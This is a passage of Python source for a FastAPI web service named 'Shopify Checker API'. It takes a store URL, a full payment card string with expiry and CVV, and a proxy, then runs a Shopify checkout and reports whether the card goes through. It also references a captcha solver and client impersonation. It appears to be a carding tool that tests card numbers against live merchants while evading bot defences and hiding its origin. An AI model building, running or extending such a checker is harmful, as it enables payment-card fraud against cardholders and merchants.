    Perform a Shopify checkout.
    Example: /shopify?site=https://renovate-wallcoverings.myshopify.com&cc=4141700002481312|12|2026|161&proxy=user:pass@123.45.67.89:8080
    """
    if not site.startswith(("http://", "https://")):
        site = "https://" + site
    parts = cc.strip().replace(" ", "").split("|")
    if len(parts) != 4:
        raise HTTPException(status_code=400, detail="Invalid card format. Use cc|mm|yyyy|cvv")
    start = _time.time()
    result = await run_shopify_check(site_url=site, card_str=cc, proxy_url=proxy, verbose=False, timeout=120.0)
    elapsed = _time.time() - start
    response = {
        "status": result.get("status", "Error"),
        "message": result.get("message", ""),
        "error_code": result.get("error_code"),
        "price": result.get("price"),
        "product": result.get("product"),
        "time": f"{elapsed:.1f}s",
        "site": site.replace("https://", "").replace("http://", "").split("/")[0]
    }
    return JSONResponse(content=response)

@app.get("/health")
async def health():
    return {"status": "ok", "captcha_solver": _CAPTCHA_SOLVER_AVAILABLE, "curl_cffi": _CURL_CFFI_AVAILABLE}

@app.get("/")
async def root():
    return {"message": "Shopify Checker API is running", "endpoint": "/shopify?site=...&cc=...&proxy=..."}

# ------------------------------------------------------------
# RUN THE SERVER
# ------------------------------------------------------------
if __name__ == "__main__":
    print("Starting Shopify API on http://0.0.0.0:8000")
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="info")
